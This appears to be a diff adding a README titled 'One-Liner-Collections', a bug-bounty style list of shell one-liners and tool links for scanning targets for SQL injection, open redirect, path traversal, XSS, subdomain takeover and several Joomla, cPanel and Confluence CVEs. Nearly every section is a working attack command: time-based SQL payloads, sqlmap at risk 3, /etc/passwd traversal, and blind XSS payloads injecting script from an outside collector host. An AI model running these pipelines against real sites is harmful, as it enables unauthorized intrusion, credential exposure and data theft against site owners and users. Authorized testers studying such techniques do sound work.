@@ -1,0 +1,201 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="one-liner-collections">One-Liner-Collections</h1>
+<p>This Repositories contains list of One Liners with Descriptions and Installation requirements</p>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Subfinder   : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a> </li>
+<li>GAU         : <a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li>
+<li>GF          : <a href="https://github.com/tomnomnom/gf">https://github.com/tomnomnom/gf</a></li>
+<li>Findomain   : <a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></li>
+<li>HTTPX       : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+<li>Anew        : <a href="https://github.com/tomnomnom/anew">https://github.com/tomnomnom/anew</a></li>
+<li>Waybackurls : <a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></li>
+<li>SQLiDetector: <a href="https://github.com/eslam3kl/SQLiDetector">https://github.com/eslam3kl/SQLiDetector</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code><span class="hljs-attribute">echo</span> http://testphp.vulnweb.com | waybackurls &gt; wayback_urls_for_target.txt ; <span class="hljs-attribute">python3</span> sqlidetector.py -f  wayback_urls_for_target.txt
+</code></pre><pre><code>subfinder -d http://TARGET.com -silent -all | <span class="hljs-type">gau</span> - blacklist ttf,woff,svg,png | <span class="hljs-type">sort</span> -u | <span class="hljs-type">gf</span> sqli &gt;gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk <span class="hljs-number">3</span> --random-agent | <span class="hljs-type">tee</span> -a sqli_report.txt
+</code></pre><pre><code>findomain -t http:<span class="hljs-regexp">//testphp</span>.vulnweb.com -<span class="hljs-string">q | httpx -silent |</span> anew | waybackurls | gf sqli &gt;&gt; sqli ; sqlmap -<span class="hljs-keyword">m</span> sqli --batch --random-agent --level <span class="hljs-number">1</span>
+</code></pre><pre><code>cat urls.txt | <span class="hljs-keyword">grep</span> <span class="hljs-string">".php"</span> | sed <span class="hljs-string">'s/\.php.*/.php\//'</span> | <span class="hljs-keyword">sort</span> -u | sed <span class="hljs-keyword">s</span>/$/%27%22%60/ | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> url <span class="hljs-keyword">do</span> ; <span class="hljs-keyword">do</span> curl --silent <span class="hljs-string">"$url"</span> | <span class="hljs-keyword">grep</span> -qs <span class="hljs-string">"You have an error in your SQL syntax"</span> &amp;&amp; echo -e <span class="hljs-string">"$url \e[1;32mSQLI by Cybertix\e[0m"</span> || echo -e <span class="hljs-string">"$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m"</span> ;done
+</code></pre><h3 id="header-based-blind-sql-injection">Header-Based Blind SQL injection</h3>
+<pre><code><span class="hljs-keyword">cat</span> domain.txt | httpx -<span class="hljs-keyword">silent</span> -H <span class="hljs-string">"X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR"</span> -rt -timeout <span class="hljs-number">20</span> -mrt <span class="hljs-string">'&gt;13'</span>
+</code></pre><h3 id="time-based-sql-injection">Time based SQL injection</h3>
+<ol>
+<li>apt install moreutils</li>
+<li>apt install parallel</li>
+</ol>
+<pre><code>cat urls.txt | <span class="hljs-type">grep</span> <span class="hljs-string">"="</span> | <span class="hljs-type">qsreplace</span> <span class="hljs-string">"1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"</span> &gt; blindsqli.txt
+</code></pre><h3 id="time-based-sql-injection-using-waybackurls">Time based SQL injection using Waybackurls</h3>
+<pre><code>waybackurls http<span class="hljs-variable">s:</span>//TARGET.COM | <span class="hljs-keyword">grep</span> -E <span class="hljs-string">'\bhttps?://\S+?=\S+'</span> | <span class="hljs-keyword">grep</span> -E <span class="hljs-string">'\.php|\.asp'</span> | <span class="hljs-keyword">sort</span> -<span class="hljs-keyword">u</span> | sed <span class="hljs-string">'s/\(=[^&amp;]*\)/=/g'</span> | tee urls.txt | <span class="hljs-keyword">sort</span> -<span class="hljs-keyword">u</span> -<span class="hljs-keyword">o</span> urls.txt
+</code></pre><pre><code>cat urls.txt | sed 's/=/=(CASE%<span class="hljs-number">20</span>WHEN%<span class="hljs-number">20</span>(<span class="hljs-number">888</span>=<span class="hljs-number">888</span>)%<span class="hljs-number">20</span>THEN%<span class="hljs-number">20</span>SLEEP(<span class="hljs-number">5</span>)%<span class="hljs-number">20</span>ELSE%<span class="hljs-number">20888</span>%<span class="hljs-number">20</span>END)/g' | xargs -I{} bash -c 'echo -e <span class="hljs-string">"<span class="hljs-subst">\n</span>target : {}<span class="hljs-subst">\n</span>"</span> &amp;&amp; time curl <span class="hljs-string">"'{}'"</span>'
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="open-redirection">Open Redirection</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Waybackurls : <a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></li>
+<li>Bhedak      : <a href="https://github.com/R0X4R/bhedak">https://github.com/R0X4R/bhedak</a></li>
+<li>GAU         : <a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li>
+<li>GF          : <a href="https://github.com/tomnomnom/gf">https://github.com/tomnomnom/gf</a></li>
+<li>QS-Replace  : <a href="https://github.com/tomnomnom/qsreplace">https://github.com/tomnomnom/qsreplace</a></li>
+<li>HTTPX       : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+<li>Subfinder   : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
+<li>Httprobe    : <a href="https://github.com/tomnomnom/httprobe">https://github.com/tomnomnom/httprobe</a></li>
+<li>Nuclei      : <a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>waybackurls TARGET.COM | grep <span class="hljs-_">-a</span> -i \=http | qsreplace <span class="hljs-string">'http://evil.com'</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> host <span class="hljs-keyword">do</span>;<span class="hljs-keyword">do</span> curl <span class="hljs-_">-s</span> -L <span class="hljs-variable">$host</span> -I| grep <span class="hljs-string">"evil.com"</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$host</span> \033[0;31mVulnerable\n"</span> ;<span class="hljs-keyword">done</span>
+</code></pre><pre><code>subfinder -dL domains.txt | <span class="hljs-type">httprobe</span> |<span class="hljs-type">tee</span> live_domain.txt; cat live_domain.txt | <span class="hljs-type">waybackurls</span> | <span class="hljs-type">tee</span> wayback.txt; cat wayback.txt | <span class="hljs-type">sort</span> -u | <span class="hljs-type">grep</span> <span class="hljs-string">"\?"</span> &gt; open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="nginx-path-traversal">NGINX Path Traversal</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>HTTPX : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>httpx -l url<span class="hljs-selector-class">.txt</span> -path <span class="hljs-string">"///////../../../../../../etc/passwd"</span> -status-<span class="hljs-selector-tag">code</span> -mc <span class="hljs-number">200</span> -ms <span class="hljs-string">'root:'</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="subdomain-takeover">Subdomain Takeover</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Subfinder    : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a> </li>
+<li>Assetfinder  : <a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li>
+<li>Amass        : <a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a></li>
+<li>Subjack      : <a href="https://github.com/haccer/subjack">https://github.com/haccer/subjack</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass <span class="hljs-class"><span class="hljs-keyword">enum</span> -<span class="hljs-title">norecursive</span> -<span class="hljs-title">noalts</span> -<span class="hljs-title">d</span> <span class="hljs-title">HOST</span> &gt;&gt; <span class="hljs-title">FILE</span>;</span> subjack -w FILE -t <span class="hljs-number">100</span> -timeout <span class="hljs-number">30</span> -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v <span class="hljs-number">3</span> &gt;&gt; takeover ;
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="extract-urls-from-source-code">Extract URLs from Source Code</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>curl <span class="hljs-string">"https://TARGET.Com"</span> | <span class="hljs-type">grep</span> -oP '(https*.//|<span class="hljs-type">www</span>\.)[^]*'
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="xss-cross-site-scripting-">XSS (Cross-Site Scripting)</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Katana       : <a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></li>
+<li>Dalfox       : <a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a></li>
+<li>Waybackurls  : <a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></li>
+<li>GF           : <a href="https://github.com/tomnomnom/gf">https://github.com/tomnomnom/gf</a></li>
+<li>Dalfox       : <a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a></li>
+<li>HTTPX      : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code><span class="hljs-built_in">echo</span> http://testphp.vulnweb.com | katana -jc <span class="hljs-_">-f</span> qurl <span class="hljs-_">-d</span> 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
+</code></pre><pre><code>waybackurls http://testphp.vulnweb.com | <span class="hljs-type">gf</span> xss | <span class="hljs-type">sed</span> 's/=.*/=/' | <span class="hljs-type">sort</span> -u | <span class="hljs-type">tee</span> XSS.txt &amp;&amp; cat XSS.txt | <span class="hljs-type">dalfox</span> -b http://chirag.bxss.<span class="hljs-built_in">in</span> pipe &gt; output.txt
+</code></pre><pre><code>cat http://target.com |<span class="hljs-string"> gau --subs </span>|<span class="hljs-string"> grep "https://" </span>|<span class="hljs-string"> grep -v "png\</span>|<span class="hljs-string">jpg\</span>|<span class="hljs-string">css\</span>|<span class="hljs-string">js\</span>|<span class="hljs-string">gif\</span>|<span class="hljs-string">txt" </span>|<span class="hljs-string"> grep "=" </span>|<span class="hljs-string"> uro </span>|<span class="hljs-string"> dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in</span>
+</code></pre><h3 id="blind-xss-mass-hunting">Blind XSS Mass Hunting</h3>
+<pre><code>cat domain.txt | waybackurls | httpx -H "User-Agent: \"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://chirag.bxss.in</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>"
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="find-endpoints-in-js">Find Endpoints in JS</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Katana    : <a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></li>
+<li>Anew      : <a href="https://github.com/tomnomnom/anew">https://github.com/tomnomnom/anew</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>katana -u <span class="hljs-string">http:</span><span class="hljs-comment">//testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="oneliner-for-cve-2023-23752-">OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Subfinder  : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
+<li>HTTPX      : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d http://TARGET.COM -<span class="hljs-literal">silent</span> -<span class="hljs-literal">all</span> | httpx -<span class="hljs-literal">silent</span> -path <span class="hljs-string">'api/index.php/v1/config/application?public=true'</span> -mc <span class="hljs-number">200</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="cpanel-cve-2023-29489-xss-one-liner">cPanel CVE-2023-29489 XSS One-Liner</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Subfinder  : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
+<li>HTTPX      : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d http://example.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">silent</span> -<span class="hljs-keyword">all</span> | httpx -<span class="hljs-keyword">silent</span> -ports http:<span class="hljs-number">80</span>,http<span class="hljs-variable">s:443</span>,<span class="hljs-number">2082</span>,<span class="hljs-number">2083</span> -path <span class="hljs-string">'/cpanelwebcall/&lt;img%20src=x%20onerror="prompt(document.domain)"&gt;aaaaaaaaaaaaaaa'</span> -mc <span class="hljs-number">400</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="wp-config-oneliner">WP-Config Oneliner</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Subfinder  : <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
+<li>HTTPX      : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -silent -d TARGET.com | httpx -silent -nc -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9003</span>,<span class="hljs-number">8088</span> -path <span class="hljs-string">"/wp-config.PHP"</span> -mc <span class="hljs-number">200</span> -t <span class="hljs-number">60</span> -status-code
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="js-secret-finder-oneliner">JS Secret Finder Oneliner</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Gau         : <a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li>
+<li>HTTPX       : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+<li>Nuclei      : <a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code><span class="hljs-keyword">echo</span> TARGET.<span class="hljs-keyword">com</span> | gau | <span class="hljs-keyword">grep</span> <span class="hljs-string">".js"</span> | httpx -content-<span class="hljs-built_in">type</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">'application/javascript'</span> | awk <span class="hljs-string">'{print $1}'</span> | nuclei -t /root/nuclei-templates/exposures/ -<span class="hljs-keyword">silent</span> &gt; secrets.txt
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="memory-dump-and-env-disclosure">Memory dump and env disclosure</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Shodan      : <a href="https://www.shodan.io">https://www.shodan.io</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code><span class="hljs-attribute">shodan</span> search org: <span class="hljs-string">"Target"</span> http.favicon.hash:<span class="hljs-number">116323821</span> --fields ip_str,port--separator | awk <span class="hljs-string">'{print <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span>}'</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="easiest-information-disclosure-in-json-body">Easiest Information Disclosure in JSON body</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>Waybackurls  : <a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></li>
+<li>HTTPX       : <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>cat subdomains.txt | <span class="hljs-type">waybackurls</span> | <span class="hljs-type">httpx</span> -mc <span class="hljs-number">200</span> -ct | <span class="hljs-type">grep</span> application/json
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="fuzz-with-127-0-0-1-as-host-header">Fuzz with 127.0.0.1 as Host header</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>FFUF  : <a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>ffuf -u <span class="hljs-link">https://target</span>[<span class="hljs-string">.</span>]<span class="hljs-link">com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs &lt;regular_content_length&gt;</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="cve-2023-0126-pre-authentication-path-traversal-vulnerability-in-sma1000">CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>cat file.txt| <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> host <span class="hljs-keyword">do</span>;<span class="hljs-keyword">do</span> curl -sk <span class="hljs-string">"http://<span class="hljs-variable">$host</span>:8443/images//////////////////../../../../../../../../etc/passwd"</span> | grep -i <span class="hljs-string">'root:'</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> <span class="hljs-string">"is VULN"</span>;<span class="hljs-keyword">done</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="get-favicon-hash-of-your-target-domain">Get Favicon Hash of your target Domain</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c '<span class="hljs-keyword">import</span> mmh3, sys, codecs; <span class="hljs-keyword">print</span>(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),<span class="hljs-string">"base64"</span>)))'
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="cve-2023-22515-one-liner-confluence-data-center-server-privilege-escalation">CVE-2023-22515 One Liner Confluence Data Center &amp; Server: Privilege Escalation</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>cat file.txt | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> host <span class="hljs-keyword">do</span>; <span class="hljs-keyword">do</span> curl -skL <span class="hljs-string">"http://<span class="hljs-variable">$host</span>/setup/setupadministrator.action"</span> | grep -i <span class="hljs-string">"&lt;title&gt;Setup System Administrator"</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> <span class="hljs-string">"Vulnerable"</span>; <span class="hljs-keyword">done</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server">CVE-2023-22518 - Improper Authorization Vulnerability in Confluence Data Center and Server</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d TARGET.COM -silent | <span class="hljs-type">httpx</span> -silent | <span class="hljs-type">nuclei</span> -t CVE<span class="hljs-number">-2023</span><span class="hljs-number">-22518.</span>yaml
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="extract-sensitive-informations-on-auth-json-endpoint-">Extract Sensitive Informations on /auth.json Endpoint.</h1>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d TARGET.COM | httpx -path <span class="hljs-string">"/auth.json"</span> -title -status-code -content-length -t <span class="hljs-number">80</span> -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9003</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="use-xargs-with-gau-to-scan-bulk-domains-without-losing-speed-">Use xargs with gau to scan bulk domains without losing speed .</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>GAU         : <a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>xargs -a alive.txt -I@ sh -c <span class="hljs-symbol">'gau</span> <span class="hljs-comment">--blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt</span>
+</code></pre><p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="blind-xss-in-x-forwarded-for-header-">Blind XSS In X-Forwarded-For Header.</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol>
+<li>BXSS         : <a href="https://github.com/ethicalhackingplayground/bxss">https://github.com/ethicalhackingplayground/bxss</a></li>
+<li>GAU          : <a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li>
+<li>Findomain    : <a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>findomain -t TARGET.COM | gau | bxss -payload '"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://chirag.bxss.in</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>' -header "X-Forwarded-For"
+</code></pre></body></html>
